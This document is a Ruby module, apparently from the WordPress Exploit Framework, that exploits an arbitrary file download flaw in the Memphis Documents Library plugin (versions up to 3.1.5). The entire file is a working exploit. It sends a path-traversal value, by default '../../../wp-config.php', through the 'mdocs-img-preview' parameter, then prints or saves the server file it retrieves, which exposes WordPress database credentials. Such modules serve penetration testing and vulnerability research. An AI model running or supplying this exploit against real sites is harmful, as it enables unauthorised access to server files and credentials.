class Wpxf::Auxiliary::MemphisDocumentsLibraryArbitraryFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Memphis Documents Library <= 3.1.5 Arbitrary File Download',
      desc: 'This module exploits a vulnerability in the Memphis Documents Library plugin '\
            'which allows you to download any arbitrary file accessible '\
            'by the user the web server is running as.',
      author: [
        'Felipe Molina',                   # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8419']
      ],
      date: 'Mar 22 2016'
    )

    register_options([
      Wpxf::Options::StringOption.new(
        name: 'remote_file',
        desc: 'The path to the remote file (relative to /wp-content/themes/antioch/lib/scripts/)',
        required: true,
        default: '../../../wp-config.php'
      ),
      Wpxf::Options::StringOption.new(
        name: 'export_path',
        desc: 'The file to save the file to',
        required: false
      )
    ])
  end

  def check
    check_plugin_version_from_readme('memphis-documents-library', '3.1.6')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def request_file
    if export_path.nil?
      emit_info 'Requesting file...'
      return execute_get_request(
        url: full_uri,
        params: { 'mdocs-img-preview' => remote_file }
      )
    else
      emit_info 'Downloading file...'
      return download_file(
        url: full_uri,
        method: :get,
        params: { 'mdocs-img-preview' => remote_file },
        local_filename: export_path
      )
    end
  end

  def run
    return false unless super

    res = request_file

    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    if export_path.nil?
      emit_success "Result: \n#{res.body}"
    else
      emit_success "Downlaoded file to #{export_path}"
    end

    true
  end
end
